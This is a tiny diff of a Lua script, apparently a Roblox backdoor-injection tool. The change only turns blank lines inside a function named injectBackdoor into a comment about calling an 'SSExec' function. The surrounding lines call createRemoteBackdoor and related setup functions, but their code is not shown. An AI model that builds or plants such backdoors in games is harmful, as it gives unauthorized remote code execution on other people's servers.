@@ -434,8 +434,7 @@ local function injectBackdoor()
         updateNotification("Already Injected")
         return
     end
-   
-    
+    -- // Call SSExec Func
     createRemoteBackdoor()
     createRemoteEvent()
     createScriptHandler()
